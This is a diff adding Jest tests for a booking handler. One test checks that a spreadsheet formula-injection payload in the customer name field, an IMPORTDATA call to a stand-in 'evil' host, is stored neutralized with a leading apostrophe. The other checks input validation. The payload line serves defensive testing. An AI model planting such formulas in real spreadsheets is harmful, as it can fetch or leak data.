@@ -118,6 +118,24 @@ describe('public handlers', () => {
     expect(fake.db[SID].Agendamentos.length).toBe(before);
   });
 
+  it('createCustomerBooking neutralizes formulas in the customer name', async () => {
+    const r = await h.createCustomerBooking(ctx, {
+      data: MON, horaInicio: '13:00', servicoId: 'S1', clienteNome: '=IMPORTDATA("https://evil/")', clienteWhatsApp: '11955554444', metodoPagamento: 'NO_LOCAL',
+    });
+    const rows = fake.db[SID].Agendamentos;
+    expect(rows[rows.length - 1][4]).toBe("'=IMPORTDATA(\"https://evil/\")");
+    expect(r.success).toBe(true);
+  });
+
+  it('createCustomerBooking validates payment method, name and phone', async () => {
+    const base = { data: MON, horaInicio: '13:00', servicoId: 'S1', clienteNome: 'Dani', clienteWhatsApp: '11955554444', metodoPagamento: 'NO_LOCAL' };
+    const n = fake.db[SID].Agendamentos.length;
+    for (const bad of [{ metodoPagamento: 'PIX_FREE' }, { metodoPagamento: '' }, { clienteNome: ' a ' }, { clienteNome: 'x'.repeat(81) }, { clienteWhatsApp: '' }, { clienteWhatsApp: '123' }]) {
+      await expect(h.createCustomerBooking(ctx, { ...base, ...bad })).rejects.toThrow(UserError);
+    }
+    expect(fake.db[SID].Agendamentos.length).toBe(n);
+  });
+
   it('getClientBookingsByPhone matches any phone format', async () => {
     const ids = async (p) => (await h.getClientBookingsByPhone(ctx, p)).map((b) => b.id);
     const a = await ids('(11) 99777-8888');
